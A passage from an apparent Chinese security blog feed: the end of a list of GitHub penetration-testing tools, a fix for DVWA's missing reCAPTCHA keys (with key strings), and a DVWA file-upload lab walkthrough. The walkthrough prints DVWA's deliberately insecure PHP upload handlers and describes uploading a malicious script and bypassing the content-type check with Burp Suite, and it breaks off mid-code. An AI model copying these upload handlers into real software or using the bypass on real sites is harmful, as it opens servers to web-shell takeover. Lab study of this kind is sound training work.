rel="noopener">https://github.com/rezasp/joomscan</a></p><p>用于检测因错误配置导致敏感信息暴露的Django应用程序:</p><p><a href="https://github.com/6IX7ine/djangohunter" target="_blank" rel="noopener">https://github.com/6IX7ine/djangohunter</a></p><p>无线安全审计工具:</p><p><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> </p><p>Python网络/渗透测试工具:</p><p><a href="https://github.com/m4n3dw0lf/PytheM" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM</a></p><p>无线安全渗透测试套件:</p><p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin</a> </p><p>无线网络审计工具，支持2-5GHZ频段:</p><p><a href="https://github.com/MisterBianco/BoopSuite" target="_blank" rel="noopener">https://github.com/MisterBianco/BoopSuite</a></p><p>ARP欺骗，无线网络劫持:</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>检查wifi是否是“大菠萝”所开放的热点，并给予网络评分:</p><p><a href="https://github.com/besimaltnok/PiFinger" target="_blank" rel="noopener">https://github.com/besimaltnok/PiFinger</a> </p><p>自动化无线网络攻击工具wifite的重构版本:</p><p><a href="https://github.com/derv82/wifite2" target="_blank" rel="noopener">https://github.com/derv82/wifite2</a> </p><p>基于BBScan via.lijiejie的本地网络扫描:</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> </p><p>基于JavaScript的的本地网络扫描:</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>白盒代码安全审计系统:</p><p><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a> </p><p>静态PHP代码审计:</p><p><a href="https://github.com/OneSourceCat/phpvulhunter" target="_blank" rel="noopener">https://github.com/OneSourceCat/phpvulhunter</a> </p><p>跟踪，分析PHP运行情况的工具:</p><p><a href="https://github.com/Qihoo360/phptrace" target="_blank" rel="noopener">https://github.com/Qihoo360/phptrace</a> </p><p>的NodeJS应用代码审计:</p><p><a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a></p><p>Python应用审计:</p><p><a href="https://github.com/shengqi158/pyvulhunter" target="_blank" rel="noopener">https://github.com/shengqi158/pyvulhunter</a></p><p>Ruby on Rails应用静态代码分析:</p><p><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="noopener">https://github.com/presidentbeef/brakeman</a></p><p>Python应用静态代码审计:</p><p><a href="https://github.com/python-security/pyt" target="_blank" rel="noopener">https://github.com/python-security/pyt</a></p><p>WordPress插件代码安全审计:</p><p><a href="https://github.com/m4ll0k/WPSploit" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSploit</a></p><p>用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码:</p><p><a href="https://github.com/emanuil/php-reaper" target="_blank" rel="noopener">https://github.com/emanuil/php-reaper</a> </p><p>用于检测潜在安全漏洞的PHP静态代码分析工具:</p><p><a href="https://github.com/lowjoel/phortress" target="_blank" rel="noopener">https://github.com/lowjoel/phortress</a></p><p>自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测:</p><p><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a></p><p>集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架:</p><p><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> </p><p>BkScanner分布式，插件化web漏洞扫描器:</p><p><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a></p><p>ysrc出品的被动式漏洞扫描工具:</p><p><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a></p><p>基于http代理的web漏洞扫描器:</p><p><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a></p><p>自动化扫描器，包括中间件扫描以及设备指纹识别:</p><p><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a></p><p>定向全自动化渗透测试工具:</p><p><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a></p><p>自动化渗透测试框架，支持cdn真实ip查找，指纹识别等:</p><p><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a></p><p>蟒插件化漏洞扫描器，支持生成扫描报表:</p><p><a href="https://github.com/Lcys/lcyscan" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan</a></p><p>渗透测试插件化并发框架:</p><p><a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a> </p><p>支持检测SQLI/ XSS / LFI / RFI等漏洞的扫描器:</p><p><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner" target="_blank" rel="noopener">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a></p><p>Web图形化的漏洞扫描框架:</p><p><a href="https://github.com/Skycrab/leakScan" target="_blank" rel="noopener">https://github.com/Skycrab/leakScan</a></p><p>一款网络化的自动化渗透测试框架:</p><p><a href="https://github.com/zhangzhenfeng/AnyScan" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/AnyScan</a></p><p>一款集成信息收集，漏洞扫描，指纹识别等的多合一扫描工具:</p><p><a href="https://github.com/Tuhinshubhra/RED_HAWK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/RED_HAWK</a></p><p>高度集成化的Web应用漏洞扫描框架，支持REST，RPC等api调用:</p><p><a href="https://github.com/Arachni/arachni" target="_blank" rel="noopener">https://github.com/Arachni/arachni</a> </p><p>集成化渗透测试辅助平台及漏洞管理平台:</p><p><a href="https://github.com/infobyte/faraday" target="_blank" rel="noopener">https://github.com/infobyte/faraday</a></p><p>渗透测试集成框架，包含超过38,000+攻击:</p><p><a href="https://github.com/juansacco/exploitpack" target="_blank" rel="noopener">https://github.com/juansacco/exploitpack</a></p><p>基于铬/歌剧插件的被动式漏洞扫描:</p><p><a href="https://github.com/swisskyrepo/DamnWebScanner" target="_blank" rel="noopener">https://github.com/swisskyrepo/DamnWebScanner</a></p><p>支持多种网络漏洞扫描，命令行环境使用:</p><p><a href="https://github.com/anilbaranyelken/tulpar" target="_blank" rel="noopener">https://github.com/anilbaranyelken/tulpar</a></p><p>web应用扫描器，支持指纹识别，文件目录爆破，SQL / XSS / RFI等漏洞扫描，也可直接用于struts，ShellShock等扫描:</p><p><a href="https://github.com/m4ll0k/Spaghetti" target="_blank" rel="noopener">https://github.com/m4ll0k/Spaghetti</a></p><p>集成子域名枚举，nmap，waf指纹识别等模块的web应用扫描器:</p><p><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest" target="_blank" rel="noopener">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> </p><p>使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞:</p><p><a href="https://github.com/0xsauby/yasuo" target="_blank" rel="noopener">https://github.com/0xsauby/yasuo</a> </p><p>Web应用自动化扫描框架，支持自动化上传webshell:</p><p><a href="https://github.com/hatRiot/clusterd" target="_blank" rel="noopener">https://github.com/hatRiot/clusterd</a></p><p>一款开源Poc调用框架，可轻松调用Pocsuite，Tangscan，Beebeeto，Knowsec老版本POC，可使用docker部署:</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a> </p><p>斗象能力中心出品并长期维护的开源漏洞检测框架:</p><p><a href="https://github.com/TophantTechnology/osprey" target="_blank" rel="noopener">https://github.com/TophantTechnology/osprey</a> </p><p>Web应用漏洞扫描框架:</p><p><a href="https://github.com/yangbh/Hammer" target="_blank" rel="noopener">https://github.com/yangbh/Hammer</a></p><p>Web应用漏洞扫描框架，基于python3:</p><p><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a></p><p>被动式漏洞扫描，支持历史cve编号漏洞识别:</p><p><a href="https://github.com/secrary/EllaScanner" target="_blank" rel="noopener">https://github.com/secrary/EllaScanner</a></p><p>OWASP ZAP核心项目出品的综合性渗透测试工具:</p><p><a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="noopener">https://github.com/zaproxy/zaproxy</a></p><p>Web服务综合型扫描器，用于指定目标的资产收集，安全配置缺陷或者安全漏洞扫描:</p><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>一款多方位信息收集，指纹识别及漏洞扫描工具:</p><p><a href="https://github.com/s0md3v/Striker" target="_blank" rel="noopener">https://github.com/s0md3v/Striker</a></p><p>一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞，支持输出pdf报告:</p><p><a href="https://github.com/dermotblair/webvulscan" target="_blank" rel="noopener">https://github.com/dermotblair/webvulscan</a> </p><p>渗透测试辅助工具，综合利用框架:</p><p><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework" target="_blank" rel="noopener">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a></p><p>基于被动式扫描框架的自动化web漏洞扫描工具:</p><p><a href="https://github.com/toyakula/luna" target="_blank" rel="noopener">https://github.com/toyakula/luna</a></p><p>渗透测试辅助框架，包含信息搜集，无线渗透，网络应用扫描等功能:</p><p><a href="https://github.com/Manisso/fsociety" target="_blank" rel="noopener">https://github.com/Manisso/fsociety</a></p><p>内置1200+插件的web漏洞扫描框架:</p><p><a href="https://github.com/boy-hack/w9scan" target="_blank" rel="noopener">https://github.com/boy-hack/w9scan</a></p><p>Web服务安全评估工具，提供基于windows操作系统的简单.exe应用:</p><p><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></p><p>使用去开发的可扩展以及高并发渗透测试框架:</p><p><a href="https://github.com/AmyangXYZ/AssassinGo" target="_blank" rel="noopener">https://github.com/AmyangXYZ/AssassinGo</a></p><p>基于Flask应用框架的漏洞扫描系统:</p><p><a href="https://github.com/jeffzh3ng/InsectsAwake" target="_blank" rel="noopener">https://github.com/jeffzh3ng/InsectsAwake</a> </p><p>一个操作上类似metasploit的web应用安全审计框架:</p><p><a href="https://github.com/m4ll0k/Galileo" target="_blank" rel="noopener">https://github.com/m4ll0k/Galileo</a></p><p>一款web应用漏洞扫描器，支持扫描反射型以及存储型xss，sql injection等漏洞:</p><p><a href="https://github.com/joker25000/Optiva-Framework" target="_blank" rel="noopener">https://github.com/joker25000/Optiva-Framework</a> </p><p>集成104个模块的Web应用程序渗透测试框架:</p><p><a href="https://github.com/theInfectedDrake/TIDoS-Framework" target="_blank" rel="noopener">https://github.com/theInfectedDrake/TIDoS-Framework</a> </p><p>一款APT入侵痕迹扫描器:</p><p><a href="https://github.com/Neo23x0/Loki" target="_blank" rel="noopener">https://github.com/Neo23x0/Loki</a></p><p>ICS设备nmap扫描脚本:</p><p><a href="https://github.com/w3h/icsmaster/tree/master/nse" target="_blank" rel="noopener">https://github.com/w3h/icsmaster/tree/master/nse</a></p><p>SDN安全评估框架:</p><p><a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://www.cnblogs.com/BOHB-yunying/p/11856178.html" target="_blank" rel="noopener">github渗透测试工具库【转载】</a></li><li><a href="https://github.com/We5ter/Scanners-Box" target="_blank" rel="noopener">Scanners Box</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决DVWA中reCAPTCHA API key missing from config file</title>
      <link href="/2020/09/14/jie-jue-dvwa-zhong-recaptcha-api-key-missing-from-config-file/"/>
      <url>/2020/09/14/jie-jue-dvwa-zhong-recaptcha-api-key-missing-from-config-file/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>​        在DVWA中测试<code>Insecure CAPTCHA</code>不安全的验证码关卡时，出现下图报错内容：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/DVWA/InsecureCAPTCHA/不安全验证码报错界面.png" alt="不安全验证码报错界面"></center><h1 id="0x02-解决思路"><a href="#0x02-解决思路" class="headerlink" title="0x02 解决思路"></a>0x02 解决思路</h1><p>​        根据报错提示信息应该是<code>reCAPTCHA</code>的问题，根据提示路径信息打开<code>config.inc.php</code>文件，显示与<code>reCAPTCHA</code>相关信息如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/DVWA/InsecureCAPTCHA/配置文件中reCAPTCHA设置为空.png" alt="配置文件中reCAPTCHA设置为空"></center><p>​        由图片信息可知，具体的出错原因是因为使用<code>reCAPTCHA</code>没有申请密钥，因此需要手动填入密钥。</p><h1 id="0x03-解决步骤"><a href="#0x03-解决步骤" class="headerlink" title="0x03 解决步骤"></a>0x03 解决步骤</h1><ol><li>打开<code>config.inc.php</code>配置文件，并将<code>recaptcha</code>相关参数修改成如下内容：</li></ol><pre class=" language-ini"><code class="language-ini">$_DVWA[ 'recaptcha_public_key' ]  <span class="token attr-value"><span class="token punctuation">=</span> '6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg';</span>$_DVWA[ 'recaptcha_private_key' ] <span class="token attr-value"><span class="token punctuation">=</span> '6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ';</span></code></pre><p>​    也可以到<a href="https://www.google.com/recaptcha/admin" target="_blank" rel="noopener">reCAPTCHA申请页面</a>申请一对网站密钥，具体操作可参考<a href="https://blog.csdn.net/dulinanaaa/article/details/88126607" target="_blank" rel="noopener">reCaptcha 的使用</a>。</p><ol start="2"><li>保存更改后的配置文件后，重新访问<code>Insecure CAPTCHA</code>模块，没有发现错误信息。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/DVWA/InsecureCAPTCHA/不安全验证码界面正常显示.png" alt="不安全验证码界面正常显示"></center><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><ul><li><a href="https://www.itfd.cn/post-757.html" target="_blank" rel="noopener">解决DVWA中reCAPTCHA API key missing from config file问题</a></li><li><a href="https://www.jianshu.com/p/9ef5f9b0844f" target="_blank" rel="noopener">DVWA报错： reCAPTCHA API key missing from config file error</a></li><li><a href="https://blog.csdn.net/dulinanaaa/article/details/88126607" target="_blank" rel="noopener">reCaptcha 的使用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-FileUpload</title>
      <link href="/2020/09/14/dvwa-fileupload/"/>
      <url>/2020/09/14/dvwa-fileupload/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>​        文件上传是指攻击者通过上传可执行脚本功能，从而获取服务器端可执行命令的权限。</p><p><strong>File Upload模块解析</strong>：</p><ul><li>文件上传界面</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/文件上传界面.png" alt="文件上传界面"></center><ul><li>文件上传操作结果</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/20200914114621.png" alt="文件上传操作结果"></center><h1 id="0x02-测试工具"><a href="#0x02-测试工具" class="headerlink" title="0x02 测试工具"></a>0x02 测试工具</h1><ul><li>FireFox</li><li>BurpSuite</li><li>菜刀</li></ul><h1 id="0x03-漏洞测试"><a href="#0x03-漏洞测试" class="headerlink" title="0x03 漏洞测试"></a>0x03 漏洞测试</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><p>设置 DVWA 安全级别为 LOW 。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Low.png" alt="SecurityLevel_Low"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Where are we going to be writing to?</span>    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Can we move the file to the upload folder?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// No</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Yes!</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$target_path} succesfully uploaded!&lt;/pre>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><ul><li>上传文件过程无任何保护措施， 直接使用将上传文件移动到可访问的 <code>hackable/uploads</code>目录下  </li></ul><p><strong>漏洞利用</strong>：</p><ul><li>使用FireFox浏览器上传恶意脚本进行攻击。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/创建恶意脚本.png" alt="创建恶意脚本"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/上传恶意脚本-Low.png" alt="上传恶意脚本-Low"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/获取上传文件路径.png" alt="获取上传文件路径"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/访问上传的文件-Low.png" alt="访问上传的文件-Low"></center><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>​        设置 DVWA 安全级别为 Medium。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_Medium.png" alt="SecurityLevel_Medium"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Where are we going to be writing to?</span>    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// File information</span>    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_type</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'type'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Is it an image?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span> <span class="token operator">||</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string">"image/png"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Can we move the file to the upload folder?</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_path</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// No</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded.&lt;/pre>'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// Yes!</span>            <span class="token keyword">echo</span> <span class="token string">"&lt;pre>{$target_path} succesfully uploaded!&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Invalid file</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><ul><li>在上传过程中对文件类型进行白名单限制（文件类型来源自数据提交的 content-type,可通过篡改绕过数据检查）</li></ul><p><strong>漏洞利用：</strong></p><ul><li>启动BurpSuite并对Proxy-Options进行设置。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/Proxy-Option设置.png" alt="Proxy-Option设置"></center><ul><li>启动FireFox浏览器并将其代理设置为<code>127.0.0.1:8080</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/FireFox代理设置.png" alt="FireFox代理设置"></center><ul><li>开启Burp Suite代理拦截功能。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/开启BurpSuite代理拦截.png" alt="开启BurpSuite代理拦截"></center><ul><li>使用浏览器上传恶意脚本进行攻击。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/创建恶意脚本-Medium.png" alt="创建恶意脚本-Medium"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/上传恶意脚本-Medium.png" alt="上传恶意脚本-Medium"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/修改content-type属性-Medium.png" alt="修改content-type属性-Medium"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/文件上传成功-Mesium.png" alt="文件上传成功-Mesium"></center><ul><li>关闭 burpsuite 拦截功能，使用浏览器请求上传文件。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/FileUpload/访问上传文件-Medium.png" alt="访问上传文件-Medium"></center><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><p>​    设置 DVWA 安全级别为 High。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/TargetDrone/DVWA/LabManual/SecurityLevel_High.png" alt="SecurityLevel_High"></center><p><strong>服务器端核心代码</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string">'Upload'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Where are we going to be writing to?</span>    <span class="token variable">$target_path</span>  <span class="token operator">=</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token punctuation">.</span> <span class="token string">"hackable/uploads/"</span><span class="token punctuation">;</span>    <span class="token variable">$target_path</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// File information</span>    <span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'size'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uploaded_tmp</span>  <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string">'uploaded'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string">'tmp_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Is it an image?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"jpg"</span> <span class="token operator">||</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"jpeg"</span> <span class="token operator">||</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"png"</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">getimagesize</span><span class="token 